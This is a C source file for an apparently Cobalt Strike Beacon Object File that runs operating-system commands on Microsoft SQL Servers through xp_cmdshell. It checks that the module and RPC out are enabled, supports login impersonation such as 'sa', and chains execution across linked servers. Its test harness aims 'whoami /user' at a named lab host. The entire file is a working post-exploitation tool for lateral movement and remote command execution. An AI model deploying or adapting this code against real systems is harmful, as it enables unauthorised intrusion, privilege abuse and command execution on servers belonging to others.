#include "bofdefs.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"


void ExecuteXpCmd(char* server, char* database, char* link, char* impersonate, char* command)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	char* query 		 = NULL;
	size_t totalSize;
	SQLRETURN ret;
	unsigned int timeout = 10;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to allocate statement handle\n");
		goto END;
	}

	//
	// verify that xp_cmdshell is enabled
	//
	if (IsModuleEnabled(stmt, "xp_cmdshell", link, impersonate))
	{
		internal_printf("[*] xp_cmdshell is enabled\n");
	}
	else
	{
		internal_printf("[!] xp_cmdshell is not enabled\n");
		goto END;
	}

	//
	// close the cursor
	//
	ret = ODBC32$SQLCloseCursor(stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to close cursor\n");
		goto END;
	}

	//
	// if using linked server, ensure rpc is enabled
	//
	if (link != NULL)
	{
		if (IsRpcEnabled(stmt, link))
		{
			internal_printf("[*] RPC out is enabled\n");
		}
		else
		{
			internal_printf("[!] RPC out is not enabled\n");
			goto END;
		}
		
		//
		// close the cursor
		//
		ODBC32$SQLCloseCursor(stmt);
	}

	//
	// don't want to hang beacons forever, so we'll try to set a timeout
	//
	ret = ODBC32$SQLSetStmtAttr(stmt, SQL_ATTR_QUERY_TIMEOUT, (SQLPOINTER)(uintptr_t)timeout, 0);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to set query timeout\n");
		goto END;
	}

	internal_printf("[*] Executing system command...\n\n");

	if (link == NULL)
	{
		char* prefix = "EXEC xp_cmdshell '";
		char* suffix = "';";

		totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));

		MSVCRT$strcpy(query, prefix);
		MSVCRT$strncat(query, command,	totalSize - MSVCRT$strlen(query) - 1);
		MSVCRT$strncat(query, suffix,	totalSize - MSVCRT$strlen(query) - 1);

		//
		// In case we're taking a hanging action, print current output
		//
		printoutput(FALSE);

		//
		// Run the query
		//
		if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE)){
			goto END;
		}

		PrintQueryResults(stmt, TRUE);
	}
	else
	{	
		char* prefix = "SELECT 1; EXEC master..xp_cmdshell '";
		char* suffix = "';";

		totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));

		MSVCRT$strcpy(query, prefix);
		MSVCRT$strncat(query, command,	totalSize - MSVCRT$strlen(query) - 1);
		MSVCRT$strncat(query, suffix,	totalSize - MSVCRT$strlen(query) - 1);

		//
		// In case we're taking a hanging action, print current output
		//
		printoutput(FALSE);

		//
		// Run the query
		//
		if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
			goto END;
		}

		internal_printf("[*] Command executed (Output not returned for linked server cmd execution)\n");
	}

	

END:
	if (query != NULL) intFree(query);
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* command;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	command 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	ExecuteXpCmd(server, database, link, impersonate, command);

	printoutput(TRUE);
};

#else

int main()
{
	internal_printf("============ BASE TEST ============\n\n");
	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "whoami /user");

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "whoami /user");

	internal_printf("\n\n============ LINK TEST ============\n\n");
	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "whoami /user");
}

#endif
